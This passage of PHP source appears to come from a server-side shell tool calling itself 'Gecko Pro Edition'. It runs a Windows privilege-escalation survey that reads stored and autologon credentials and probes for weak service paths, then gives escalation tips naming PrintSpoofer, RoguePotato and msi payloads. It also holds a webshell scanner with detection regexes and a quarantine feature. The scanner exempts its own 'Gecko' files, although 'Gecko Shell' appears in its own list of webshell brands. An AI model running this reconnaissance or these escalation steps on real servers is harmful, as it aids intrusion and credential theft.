        '/SeDebugPrivilege\s+Enabled/i', '/SeBackupPrivilege\s+Enabled/i', '/SeRestorePrivilege\s+Enabled/i',
        '/SeTakeOwnershipPrivilege\s+Enabled/i', '/SeLoadDriverPrivilege\s+Enabled/i', '/SeTcbPrivilege\s+Enabled/i',
    ));

    secPrivescAppendSection($lines, '[3] LOCAL ADMINISTRATORS', 'net localgroup administrators 2>nul', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[4] UAC SETTINGS', 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 2>nul', $baseDir, $warnCount, '/EnableLUA\s+0x0/i');

    secPrivescAppendSection($lines, '[5] ALWAYSINSTALL ELEVATED', 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul', $baseDir, $warnCount, '/AlwaysInstallElevated\s+0x1/i');

    secPrivescAppendSection($lines, '[6] STORED CREDENTIALS', 'cmdkey /list 2>nul', $baseDir, $warnCount, '/Target:/i');

    secPrivescAppendSection($lines, '[7] AUTOLOGON CREDENTIALS', 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul', $baseDir, $warnCount, array(
        '/DefaultPassword/i', '/AutoAdminLogon\s+0x1/i',
    ));

    secPrivescAppendSection($lines, '[8] SYSTEM INFO & PATCHES', 'systeminfo 2>nul | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[9] INSTALLED HOTFIXES (sample)', 'wmic qfe list brief 2>nul | more +0', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[10] UNQUOTED SERVICE PATHS', 'wmic service get name,displayname,pathname,startmode 2>nul | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "?"', $baseDir, $warnCount, array(
        '/PathName.*\\s[^"]/i', '/\.exe\s/i',
    ));

    secPrivescAppendSection($lines, '[11] SERVICES (non-Windows paths)', 'wmic service get name,pathname,startname 2>nul | findstr /i /v "C:\\Windows\\" | findstr /i /v "PathName"', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[12] SCHEDULED TASKS (non-system paths sample)', 'schtasks /query /fo LIST /v 2>nul | findstr /i "Task To Run"', $baseDir, $warnCount, array(
        '/Task To Run:.*\\temp\\/i', '/Task To Run:.*\\users\\/i', '/Task To Run:.*powershell.*-enc/i',
        '/Task To Run:.*cmd\.exe.*\/c.*http/i',
    ));

    secPrivescAppendSection($lines, '[13] RUN / RUNONCE KEYS', 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul & reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[14] WEAK SERVICE PERMISSIONS (sc qc)', 'sc qc Spooler 2>nul & sc qc wuauserv 2>nul', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[15] DRIVERS (third-party)', 'driverquery /v 2>nul | findstr /i /v "Microsoft Windows" | more +0', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[16] LOCAL USERS & PASSWORD POLICY', 'net user 2>nul & echo --- & net accounts 2>nul', $baseDir, $warnCount, '/Password required\s+No/i');

    secPrivescAppendSection($lines, '[17] NETWORK SHARES', 'net share 2>nul', $baseDir, $warnCount, '/ADMIN\$|C\$/i');

    secPrivescAppendSection($lines, '[18] LISTENING PORTS', 'netstat -ano | findstr LISTENING | more +0', $baseDir, $warnCount);

    secPrivescAppendSection($lines, '[19] IIS / WEB CONTEXT', 'whoami & echo --- & set APPPOOL 2>nul', $baseDir, $warnCount, '/IIS/i');

    secPrivescAppendSection($lines, '[20] POWERSHELL EXECUTION POLICY', 'powershell -Command "Get-ExecutionPolicy -List" 2>nul', $baseDir, $warnCount, '/Unrestricted|Bypass/i');

    $lines[] = str_repeat('=', 52);
    $lines[] = 'SUMMARY: ' . $warnCount . ' warning(s) — review [WARN] lines';
    $lines[] = 'Tips: SeImpersonate → PrintSpoofer/RoguePotato · AlwaysInstallElevated → msi payload · Unquoted path → service hijack';
    if ($warnCount === 0) {
        $lines[] = 'No automated patterns matched. Continue with WinPEAS, PrivescCheck, manual service review.';
    }

    return array(
        'ok' => true,
        'output' => implode("\n", $lines),
        'count' => $warnCount,
        'critical' => $warnCount,
    );
}

function btGetScanRoots($baseDir, $scanPath)
{
    $roots = array();
    if ($scanPath !== '') {
        $resolved = resolvePath($baseDir, $scanPath, false);
        if ($resolved && @is_dir($resolved)) $roots[] = $resolved;
    }
    if (empty($roots)) {
        $roots[] = $baseDir;
        $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
        if ($docRoot && @is_dir($docRoot)) $roots[] = $docRoot;
        foreach (array('/var/www', '/home', '/tmp', '/var/tmp', '/opt', '/srv', '/usr/local') as $r) {
            if (@is_dir($r) && !in_array($r, $roots, true)) $roots[] = $r;
        }
    }
    return array_values(array_unique($roots));
}

function btWebshellSignatures($aggressive)
{
    $sigs = array(
        array('pattern' => '/eval\s*\(\s*base64_decode/is', 'score' => 45, 'name' => 'eval(base64_decode())'),
        array('pattern' => '/eval\s*\(\s*gz(inflate|uncompress|decode)/is', 'score' => 45, 'name' => 'eval(gz*)'),
        array('pattern' => '/eval\s*\(\s*str_rot13/is', 'score' => 40, 'name' => 'eval(str_rot13())'),
        array('pattern' => '/eval\s*\(\s*gzuncompress/is', 'score' => 45, 'name' => 'eval(gzuncompress)'),
        array('pattern' => '/assert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/is', 'score' => 45, 'name' => 'assert($_INPUT)'),
        array('pattern' => '/preg_replace\s*\([^)]*\/e["\']/is', 'score' => 45, 'name' => 'preg_replace /e'),
        array('pattern' => '/create_function\s*\(/is', 'score' => 35, 'name' => 'create_function()'),
        array('pattern' => '/(shell_exec|system|passthru|proc_open|popen|pcntl_exec)\s*\([^)]*\$_(GET|POST|REQUEST)/is', 'score' => 40, 'name' => 'cmd_exec($_INPUT)'),
        array('pattern' => '/@eval\s*\(/is', 'score' => 35, 'name' => '@eval()'),
        array('pattern' => '/gzinflate\s*\(\s*base64_decode/is', 'score' => 40, 'name' => 'gzinflate(base64)'),
        array('pattern' => '/base64_decode\s*\(\s*[\'"][A-Za-z0-9+\/=]{80,}/is', 'score' => 25, 'name' => 'long base64 blob'),
        array('pattern' => '/\$_(GET|POST|REQUEST|COOKIE)\s*\[[^\]]+\]\s*\(/is', 'score' => 30, 'name' => 'variable func call $_INPUT'),
        array('pattern' => '/(FilesMan|c99shell|r57shell|WSO\s|b374k|alfa\s*shell|AnonymousFox|IndoXploit|Gecko\s*Shell|mini\s*shell)/is', 'score' => 50, 'name' => 'known webshell brand'),
        array('pattern' => '/move_uploaded_file\s*\([^)]+\)\s*;[\s\S]{0,200}(eval|assert)/is', 'score' => 35, 'name' => 'upload+eval'),
        array('pattern' => '/\\$\{\s*[\'"]\\\\x/is', 'score' => 30, 'name' => 'hex var obfuscation'),
        array('pattern' => '/(passthru|shell_exec|system|exec)\s*\(\s*\$_(GET|POST|REQUEST)/is', 'score' => 40, 'name' => 'direct webshell cmd'),
        array('pattern' => '/php:\/\/input/is', 'score' => 15, 'name' => 'php://input wrapper'),
        array('pattern' => '/(cmd|command|exec|shell|backdoor)\s*[\'"]?\s*=>\s*\$_(GET|POST|REQUEST)/is', 'score' => 30, 'name' => 'cmd parameter handler'),
        array('pattern' => '/chr\s*\(\s*\d+\s*\)\s*\.\s*chr/is', 'score' => 20, 'name' => 'chr() obfuscation chain'),
        array('pattern' => '/\\$[a-zA-Z_\x7f-\xff]{1,8}\s*=\s*[\'"][a-zA-Z0-9+\/=]{100,}[\'"]/is', 'score' => 15, 'name' => 'suspicious encoded string'),
        array('pattern' => '/\\$_(GET|POST|REQUEST|COOKIE)\s*\[[^\]]+\]\s*\(\s*\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'double $_INPUT invoke'),
        array('pattern' => '/(include|require)(_once)?\s*\(\s*\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'dynamic include $_INPUT'),
        array('pattern' => '/file_put_contents\s*\([^,]+,\s*\$_(POST|REQUEST)/is', 'score' => 30, 'name' => 'file_put from POST'),
        array('pattern' => '/\\$[a-z_]+\s*=\s*str_replace\s*\([^)]+\)\s*;\s*eval/is', 'score' => 35, 'name' => 'str_replace+eval'),
        array('pattern' => '/call_user_func\s*\(\s*[\'"]assert[\'"]/is', 'score' => 35, 'name' => 'call_user_func assert'),
        array('pattern' => '/ReflectionFunction\s*\(/is', 'score' => 20, 'name' => 'ReflectionFunction'),
        array('pattern' => '/\\$_(SERVER|FILES)\s*\[[^\]]+\]\s*\(/is', 'score' => 25, 'name' => '$_SERVER/FILES invoke'),
        array('pattern' => '/`[^`]*\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'backtick cmd $_INPUT'),
        array('pattern' => '/\\$[a-zA-Z0-9_]+\s*=\s*\\$[a-zA-Z0-9_]+\s*\(\s*\\$[a-zA-Z0-9_]+\s*\)\s*;\s*\\$[a-zA-Z0-9_]+\s*\(/is', 'score' => 20, 'name' => 'variable function chain'),
        array('pattern' => '/(cmd\.exe|\/bin\/sh|\/bin\/bash).*\\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'shell binary + input'),
        array('pattern' => '/\\$[a-zA-Z0-9_]{1,3}\s*=\s*[\'"]\\x[0-9a-f]{2}/is', 'score' => 18, 'name' => 'hex byte construction'),
        array('pattern' => '/\\$GLOBALS\s*\[[^\]]+\]\s*\(/is', 'score' => 22, 'name' => '$GLOBALS func call'),
        array('pattern' => '/(WSO|uploader|FilesMan|Mini Shell|Bypass|Safe0ver|Locus7s)/is', 'score' => 40, 'name' => 'webshell keyword'),
        array('pattern' => '/\\$_(GET|POST|REQUEST)\s*\[[\'"]pass[\'"]\]/is', 'score' => 18, 'name' => 'password gate $_INPUT'),
        array('pattern' => '/fsockopen\s*\([^)]+\$_(GET|POST|REQUEST)/is', 'score' => 30, 'name' => 'fsockopen backconnect'),
        array('pattern' => '/stream_socket_client\s*\(/is', 'score' => 12, 'name' => 'stream_socket_client'),
        array('pattern' => '/\\$[a-zA-Z0-9_]+\s*=\s*\\$\{[^}]+\}/is', 'score' => 18, 'name' => 'variable variables'),
    );
    if ($aggressive) {
        $sigs = array_merge($sigs, array(
            array('pattern' => '/\\$_(GET|POST|REQUEST)\s*\[[\'"]cmd[\'"]\]/is', 'score' => 28, 'name' => 'cmd parameter'),
            array('pattern' => '/\\$_(GET|POST|REQUEST)\s*\[[\'"]0[\'"]\]\s*\(/is', 'score' => 32, 'name' => 'array index 0 invoke'),
            array('pattern' => '/strrev\s*\(\s*base64_decode/is', 'score' => 30, 'name' => 'strrev+base64'),
            array('pattern' => '/rawurldecode\s*\(\s*base64_decode/is', 'score' => 28, 'name' => 'urldecode+base64'),
            array('pattern' => '/\\$[a-zA-Z0-9_]+\(\$\{?\\$_(GET|POST|REQUEST)/is', 'score' => 35, 'name' => 'func variable from input'),
        ));
    }
    return $sigs;
}

function btFilenameIOCs($aggressive)
{
    $iocs = array(
        'c99.php' => 55, 'r57.php' => 55, 'wso.php' => 55, 'wso2.php' => 55, 'wso1337.php' => 55,
        'shell.php' => 40, 'cmd.php' => 40, 'backdoor.php' => 55, 'b374k.php' => 55, 'b374.php' => 50,
        'alfa.php' => 50, 'alf.php' => 45, 'mini.php' => 25, 'uploader.php' => 30, 'upload.php' => 20,
        'x.php' => 25, 'xx.php' => 25, '0.php' => 30, '1.php' => 25, '2.php' => 22,
        'indoxploit.php' => 55, 'fox.php' => 40, 'leaf.php' => 35, 'marijuana.php' => 50,
        'adminer.php' => 10, '.user.ini' => 25, 'php.ini' => 15,
        'sym403.php' => 45, 'symlink.php' => 40, 'priv8.php' => 45, 'root.php' => 35,
        'hack.php' => 40, 'haxor.php' => 45, '1337.php' => 40, 'locus.php' => 40,
        'c100.php' => 45, 'r00t.php' => 40, 'sh.php' => 35, 'bypass.php' => 35,
        'up.php' => 28, 'upl.php' => 28, 'filemanager.php' => 15, 'fm.php' => 30,
    );
    if ($aggressive) {
        $iocs['test.php'] = 12;
        $iocs['tmp.php'] = 18;
        $iocs['cache.php'] = 15;
        $iocs['log.php'] = 18;
        $iocs['images.php'] = 22;
        $iocs['class.php'] = 12;
        $iocs['config.php.bak'] = 30;
        $iocs['wp-config.php.bak'] = 35;
    }
    return $iocs;
}

function btFilenameHeuristics($basename, &$score, &$hits, $aggressive)
{
    if (preg_match('/^[a-f0-9]{8,}\.(php|phtml|inc|php5)$/i', $basename)) {
        $score += 28;
        $hits[] = 'hex-random filename';
    }
    if (preg_match('/^[a-z0-9]{1,2}\.(php|phtml)$/i', $basename)) {
        $score += 22;
        $hits[] = 'short random php name';
    }
    if (preg_match('/\.(jpg|jpeg|png|gif|ico|css|txt|zip|tar|gz|bmp|webp)\.(php|phtml|php5)$/i', $basename)) {
        $score += 38;
        $hits[] = 'double extension';
    }
    if (preg_match('/(shell|backdoor|hack|exploit|webshell|c99|r57|wso|b374k|cmd|uploader|bypass|priv8|hax|1337|alfa|indoxploit|revshell|payload|trojan)/i', $basename)) {
        $score += 22;
        $hits[] = 'malware keyword in filename';
    }
    if ($aggressive && preg_match('/^[a-f0-9]{12,}\.(php|phtml|php5|inc)$/i', $basename)) {
        $score += 18;
        $hits[] = 'aggressive hex filename';
    }
}

function btSeverityLabel($score)
{
    if ($score >= 50) return 'CRITICAL';
    if ($score >= 30) return 'HIGH';
    if ($score >= 15) return 'MEDIUM';
    return 'LOW';
}

function btPathNorm($path)
{
    return strtolower(str_replace('\\', '/', (string)$path));
}

function btIsProtectedFile($path, $baseDir)
{
    static $selfReal = null;
    if ($selfReal === null) {
        $selfReal = @realpath(__FILE__);
    }
    $real = @realpath($path);
    if (!$real) return false;

    if ($selfReal && btPathNorm($real) === btPathNorm($selfReal)) {
        return true;
    }

    $bn = strtolower(basename($real));
    if (in_array($bn, array('.adminer.php', 'manifest.json'), true)) {
        return true;
    }

    if (strpos(btPathNorm($real), '/.gecko_quarantine/') !== false) {
        return true;
    }

    $head = @file_get_contents($real, false, null, 0, 8192);
    if ($head !== false && $head !== '') {
        if (stripos($head, 'Gecko Pro Edition') !== false && stripos($head, 'function jsonOut') !== false) {
            return true;
        }
        if (stripos($head, 'function btWebshellScan') !== false && stripos($head, 'function runBlueTool') !== false) {
            return true;
        }
    }

    return false;
}

function btHighConfidenceHits()
{
    return array(
        'eval(base64_decode())', 'eval(gz*)', 'eval(gzuncompress)', 'eval(str_rot13())',
        'assert($_INPUT)', 'preg_replace /e', 'cmd_exec($_INPUT)', 'direct webshell cmd',
        'known webshell brand', 'gzinflate(base64)', 'func variable from input',
        'double extension', 'php tag in non-php extension (polyglot)', 'upload+eval',
        'backtick cmd $_INPUT', 'strrev+base64', 'urldecode+base64', 'dynamic include $_INPUT',
        'tiny file + dangerous func', 'webshell keyword',
    );
}

function btMoveFile($src, $dest)
{
    $destDir = dirname($dest);
    if (!is_dir($destDir)) {
        @mkdir($destDir, 0700, true);
    }
    if (@rename($src, $dest)) {
        return is_file($dest) && !is_file($src);
    }
    if (@copy($src, $dest) && is_file($dest) && filesize($dest) > 0) {
        if (@unlink($src)) {
            return true;
        }
        @unlink($dest);
    }
    return false;
}

function btScanExtensions()
{
    return array('php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'php8', 'phar', 'inc', 'pht', 'phpt',
        'asp', 'aspx', 'jsp', 'js', 'shtml', 'htaccess', 'cgi', 'pl', 'py', 'sh', 'rb', 'vb', 'vbs');
}

function btAnalyzeFile($path, $signatures, $filenameIOCs, $selfPath, $aggressive, $baseDir)
{
    $realPath = @realpath($path);
    if (!$realPath || !@is_file($realPath)) {
        return null;
    }
    if (btIsProtectedFile($realPath, $baseDir)) {
        return null;
    }

    $score = 0;
    $hits = array();
    $basename = strtolower(basename($realPath));
    $ext = strtolower(pathinfo($realPath, PATHINFO_EXTENSION));

    $allowedExt = btScanExtensions();
    if (!in_array($ext, $allowedExt, true) && $basename !== '.htaccess' && $basename !== '.user.ini') {
        if (!$aggressive || !preg_match('/\.(jpg|jpeg|png|gif|bmp|ico|svg|webp|txt|log)$/i', $basename)) {
            return null;
        }
    }

    foreach ($filenameIOCs as $ioc => $pts) {
        if ($basename === strtolower($ioc)) {
            $score += (int)$pts;
            $hits[] = 'filename:' . $ioc;
        }
    }
    btFilenameHeuristics($basename, $score, $hits, $aggressive);

    $size = @filesize($realPath);
    $maxRead = $aggressive ? 262144 : 98304;
    $maxSize = $aggressive ? 2097152 : 5242880;

    if ($size === false || $size > $maxSize) {
        if ($score >= 45) {
            return array('path' => $realPath, 'score' => $score, 'severity' => btSeverityLabel($score), 'hits' => $hits, 'size' => $size, 'modified' => @filemtime($realPath), 'note' => 'large file — filename IOC only');
        }
        return null;
    }

    $content = @file_get_contents($realPath, false, null, 0, min((int)$size, $maxRead));
    if ($content === false || $content === '') {
        if ($score >= 40) {
            return array('path' => $realPath, 'score' => $score, 'severity' => btSeverityLabel($score), 'hits' => $hits, 'size' => $size, 'modified' => @filemtime($realPath));
        }
        return null;
    }

    foreach ($signatures as $sig) {
        if (@preg_match($sig['pattern'], $content)) {
            $score += (int)$sig['score'];
            $hits[] = $sig['name'];
        }
    }

    if ($size < 250 && preg_match('/eval\s*\(|assert\s*\(\s*\$_(GET|POST|REQUEST)|shell_exec\s*\(\s*\$_(GET|POST|REQUEST)/is', $content)) {
        $score += 30;
        $hits[] = 'tiny file + dangerous func';
    }

    if (preg_match('/<\?(php|=)/i', $content) && preg_match('/\.(jpg|jpeg|png|gif|bmp|ico|svg|webp|txt|css|js)$/i', $basename)) {
        $score += 40;
        $hits[] = 'php tag in non-php extension (polyglot)';
    }

    $hits = array_values(array_unique($hits));
    if (empty($hits)) {
        return null;
    }

    $highList = btHighConfidenceHits();
    $hasHigh = false;
    foreach ($hits as $h) {
        if (in_array($h, $highList, true)) {
            $hasHigh = true;
            break;
        }
        if (strpos($h, 'filename:') === 0 && preg_match('/filename:(c99|r57|wso|b374k|backdoor|indoxploit|alfa|shell\.php|cmd\.php)/i', $h)) {
            $hasHigh = true;
            break;
        }
    }

    if (!$hasHigh && $score < 50) {
        return null;
    }
    if ($score < ($aggressive ? 28 : 35)) {
        return null;
    }

    return array(
        'path' => $realPath,
        'score' => $score,
        'severity' => btSeverityLabel($score),
        'hits' => $hits,
        'size' => (int)$size,
        'modified' => @filemtime($realPath),
    );
}

function btCollectCandidateFiles($roots, $baseDir, $maxFiles, $maxDepth)
{
    $files = array();
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $exts = btScanExtensions();
    if (!$isWin) {
        $nameParts = array();
        foreach ($exts as $e) {
            $nameParts[] = '-name ' . geckoEscapeshellarg('*.' . $e);
        }
        $nameParts[] = '-name ' . geckoEscapeshellarg('.htaccess');
        $nameParts[] = '-name ' . geckoEscapeshellarg('.user.ini');
        $nameParts[] = '-name ' . geckoEscapeshellarg('*.php*');
        $expr = '\( ' . implode(' -o ', $nameParts) . ' \)';
        foreach ($roots as $root) {
            $cmd = 'find ' . geckoEscapeshellarg($root) . ' -maxdepth ' . (int)$maxDepth . ' ' . $expr . ' -type f 2>/dev/null | head -' . (int)$maxFiles;
            $out = runTerminal($cmd, $baseDir);
            foreach (explode("\n", $out['output']) as $line) {
                $line = trim($line);
                if ($line !== '' && @is_file($line) && !btIsProtectedFile($line, $baseDir)) {
                    $files[$line] = $line;
                }
            }
            if (count($files) >= $maxFiles) break;
        }
    } else {
        foreach ($roots as $root) {
            btWalkCandidates($root, $exts, $files, 0, $maxDepth, $maxFiles, $baseDir);
            if (count($files) >= $maxFiles) break;
        }
    }
    return array_values($files);
}

function btWalkCandidates($dir, $exts, &$files, $depth, $maxDepth, $maxFiles, $baseDir)
{
    if ($depth > $maxDepth || count($files) >= $maxFiles) return;
    $h = @opendir($dir);
    if (!$h) return;
    while (($name = readdir($h)) !== false) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        if (@is_file($full)) {
            $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
            if ((in_array($ext, $exts, true) || $name === '.htaccess' || $name === '.user.ini') && !btIsProtectedFile($full, $baseDir)) {
                $files[$full] = $full;
            }
        } elseif (@is_dir($full) && $depth < $maxDepth) {
            if ($name === '.gecko_quarantine') continue;
            btWalkCandidates($full, $exts, $files, $depth + 1, $maxDepth, $maxFiles, $baseDir);
        }
        if (count($files) >= $maxFiles) break;
    }
    closedir($h);
}

function btFormatFindings($title, $findings, $scanned, $roots)
{
    usort($findings, function ($a, $b) {
        return (int)$b['score'] - (int)$a['score'];
    });
    $lines = array('=== ' . $title . ' ===', 'Roots: ' . implode(', ', $roots), 'Scanned: ' . $scanned . ' files', 'Findings: ' . count($findings), '');
    if (empty($findings)) {
        $lines[] = '(no threats detected in scan scope)';
        return implode("\n", $lines);
    }
    foreach ($findings as $f) {
        $mod = isset($f['modified']) ? date('Y-m-d H:i', $f['modified']) : '-';
        $sz = isset($f['size']) ? secFormatBytes($f['size']) : '-';
        $lines[] = '[' . $f['severity'] . ' score:' . $f['score'] . '] ' . $f['path'];
        $lines[] = '  modified:' . $mod . '  size:' . $sz . '  signals:' . implode(', ', $f['hits']);
        if (isset($f['note'])) $lines[] = '  note:' . $f['note'];
    }
    return implode("\n", $lines);
}

function btWebshellScan($baseDir, $scanPath, $aggressive)
{
    @set_time_limit(600);
    $aggressive = ($aggressive === true || $aggressive === 1 || $aggressive === '1' || $aggressive === 'true');
    $roots = btGetScanRoots($baseDir, $scanPath);
    $signatures = btWebshellSignatures($aggressive);
    $filenameIOCs = btFilenameIOCs($aggressive);
    $maxFiles = $aggressive ? 8000 : 2500;
    $maxFindings = $aggressive ? 500 : 120;
    $maxDepth = $aggressive ? 14 : 9;
    $candidates = btCollectCandidateFiles($roots, $baseDir, $maxFiles, $maxDepth);
    $findings = array();
    foreach ($candidates as $file) {
        $hit = btAnalyzeFile($file, $signatures, $filenameIOCs, __FILE__, $aggressive, $baseDir);
        if ($hit) $findings[] = $hit;
        if (count($findings) >= $maxFindings) break;
    }
    $mode = $aggressive ? 'AGGRESSIVE' : 'STANDARD';
    $out = btFormatFindings('BACKDOOR / WEBSHELL SCAN [' . $mode . ']', $findings, count($candidates), $roots);
    $critical = 0;
    foreach ($findings as $f) {
        if ($f['severity'] === 'CRITICAL' || $f['severity'] === 'HIGH') $critical++;
    }
    return array(
        'ok' => true,
        'output' => $out,
        'count' => count($findings),
        'critical' => $critical,
        'scanned' => count($candidates),
        'findings' => $findings,
        'aggressive' => $aggressive,
    );
}

function btResolveThreatPath($baseDir, $path)
{
    $path = trim((string)$path);
    if ($path === '') return null;

    $tryPaths = array($path);
    if (DIRECTORY_SEPARATOR === '\\') {
        $tryPaths[] = str_replace('/', '\\', $path);
        $tryPaths[] = str_replace('\\', '/', $path);
    }

    foreach ($tryPaths as $try) {
        if (preg_match('/^[A-Za-z]:/', $try) || (strlen($try) > 0 && $try[0] === '/')) {
            $real = @realpath($try);
            if ($real && @is_file($real)) {
                return $real;
            }
        } else {
            $resolved = resolvePath($baseDir, $try);
            if ($resolved && @is_file($resolved)) {
                $real = @realpath($resolved);
                return $real ? $real : $resolved;
            }
        }
    }
    return null;
}

function btQuarantineDir($baseDir)
{
    $dir = rtrim($baseDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '.gecko_quarantine';
    if (!is_dir($dir)) {
        if (!@mkdir($dir, 0700, true) && !is_dir($dir)) {
            $tmp = sys_get_temp_dir();
            $dir = rtrim($tmp ? $tmp : $baseDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'gecko_quarantine_' . substr(md5($baseDir), 0, 12);
            @mkdir($dir, 0700, true);
        }
    }
    return $dir;
}

function btManifestPath($baseDir)
{
    return btQuarantineDir($baseDir) . DIRECTORY_SEPARATOR . 'manifest.json';
}

function btLoadManifest($baseDir)
{
    $file = btManifestPath($baseDir);
    if (!is_file($file)) return array();
    $raw = @file_get_contents($file);
    if (!$raw) return array();
    $data = json_decode($raw, true);
    if (!is_array($data)) return array();
    $valid = array();
    foreach ($data as $entry) {
        if (!is_array($entry) || empty($entry['id']) || empty($entry['original'])) continue;
        if (!empty($entry['quarantine']) && !is_file($entry['quarantine'])) continue;
        $valid[] = $entry;
    }
    if (count($valid) !== count($data)) {
        btSaveManifest($baseDir, $valid);
    }
    return $valid;
}

function btSaveManifest($baseDir, $entries)
{
    $file = btManifestPath($baseDir);
    @file_put_contents($file, json_encode(array_values($entries), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
}

function btListQuarantine($baseDir)
{
    $entries = btLoadManifest($baseDir);
    usort($entries, function ($a, $b) {
        return (int)(isset($b['moved_at']) ? $b['moved_at'] : 0) - (int)(isset($a['moved_at']) ? $a['moved_at'] : 0);
    });
    $dir = btQuarantineDir($baseDir);
    $lines = array('=== QUARANTINE (TMP) ===', 'Location: ' . $dir, 'Items: ' . count($entries), '');
    foreach ($entries as $e) {
        $when = isset($e['moved_at']) ? date('Y-m-d H:i:s', $e['moved_at']) : '-';
        $lines[] = '[' . $e['id'] . '] ' . $e['original'];
        $lines[] = '  quarantined: ' . $when . ' → ' . (isset($e['quarantine']) ? $e['quarantine'] : '-');
    }
    if (empty($entries)) $lines[] = '(empty — no quarantined files)';
    return array(
        'ok' => true,
        'output' => implode("\n", $lines),
        'entries' => $entries,
        'count' => count($entries),
        'dir' => $dir,
    );
}

function btDeleteThreats($baseDir, $paths)
{
    $quarantined = array();
    $failed = array();
    if (!is_array($paths)) {
        if (is_string($paths) && $paths !== '') $paths = array($paths);
        else $paths = array();
    }
    if (count($paths) > 200) {
        return array('ok' => false, 'error' => 'Max 200 files per batch');
    }
    $qdir = btQuarantineDir($baseDir);
    if (!is_dir($qdir) || !is_writable($qdir)) {
        return array('ok' => false, 'error' => 'Quarantine folder not writable: ' . $qdir);
    }
    $manifest = btLoadManifest($baseDir);

    foreach ($paths as $p) {
        $p = trim((string)$p);
        if ($p === '') continue;
        $resolved = btResolveThreatPath($baseDir, $p);
        if (!$resolved) {
            $failed[] = array('path' => $p, 'error' => 'File not found');
            continue;
        }
        if (btIsProtectedFile($resolved, $baseDir)) {
            $failed[] = array('path' => $p, 'error' => 'Protected file (scanner/core)');
            continue;
        }
        $id = substr(md5($resolved . microtime(true) . mt_rand()), 0, 16);
        $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', basename($resolved));
        $qpath = $qdir . DIRECTORY_SEPARATOR . $id . '_' . $safeName;
        if (!btMoveFile($resolved, $qpath)) {
            $failed[] = array('path' => $resolved, 'error' => 'Move failed — check folder permissions');
            continue;
        }
        $entry = array(
            'id' => $id,
            'original' => $resolved,
            'quarantine' => $qpath,
            'basename' => basename($resolved),
            'moved_at' => time(),
        );
        $manifest[] = $entry;
        $quarantined[] = $entry;
    }
    btSaveManifest($baseDir, $manifest);

    $out = "=== QUARANTINE REPORT ===\n";
    $out .= 'Location: ' . $qdir . "\n";
    $out .= 'Quarantined: ' . count($quarantined) . ' · Failed: ' . count($failed) . "\n\n";
    foreach ($quarantined as $q) {
        $out .= '[MOVED] ' . $q['original'] . "\n";
        $out .= '        → ' . $q['quarantine'] . ' (id:' . $q['id'] . ")\n";
    }
    foreach ($failed as $f) {
        $out .= '[FAILED]  ' . $f['path'] . ' — ' . $f['error'] . "\n";
    }
    if (empty($quarantined) && !empty($failed)) {
        return array('ok' => false, 'error' => 'No files moved. ' . $failed[0]['error'], 'output' => $out, 'failed' => $failed);
    }
    $out .= "\nRestore anytime from Quarantine section below.";
    return array(
        'ok' => true,
        'output' => $out,
        'quarantined' => $quarantined,
        'deleted' => array_map(function ($e) { return $e['original']; }, $quarantined),
        'failed' => $failed,
        'count' => count($quarantined),
        'dir' => $qdir,
    );
}

function btRestoreThreats($baseDir, $ids)
{
    if (!is_array($ids)) {
        if (is_string($ids) && $ids !== '') $ids = array($ids);
        else $ids = array();
    }
    if (empty($ids)) {
        return array('ok' => false, 'error' => 'No items selected to restore');
    }
    $manifest = btLoadManifest($baseDir);
    $restored = array();
    $failed = array();
    $remaining = array();
    $idSet = array_flip(array_map('strval', $ids));

    foreach ($manifest as $entry) {
        $eid = (string)$entry['id'];
        if (!isset($idSet[$eid])) {
            $remaining[] = $entry;
            continue;
        }
        $original = isset($entry['original']) ? $entry['original'] : '';
        $qpath = isset($entry['quarantine']) ? $entry['quarantine'] : '';
        if ($original === '' || !is_file($qpath)) {
            $failed[] = array('id' => $eid, 'path' => $original, 'error' => 'Quarantine file missing');
            continue;
        }
        $dest = $original;
        if (is_file($dest)) {
            $dest = dirname($original) . DIRECTORY_SEPARATOR . pathinfo($original, PATHINFO_FILENAME) . '.restored.' . time() . (pathinfo($original, PATHINFO_EXTENSION) ? '.' . pathinfo($original, PATHINFO_EXTENSION) : '');
        }
        $parent = dirname($dest);
        if (!is_dir($parent)) {
            @mkdir($parent, 0755, true);
        }
        if (!@rename($qpath, $dest)) {
            if (!btMoveFile($qpath, $dest)) {
                $failed[] = array('id' => $eid, 'path' => $original, 'error' => 'Restore failed');
                $remaining[] = $entry;
                continue;
            }
        }
        $restored[] = array('id' => $eid, 'original' => $original, 'restored_to' => $dest);
    }
    btSaveManifest($baseDir, $remaining);

    $out = "=== RESTORE REPORT ===\n";
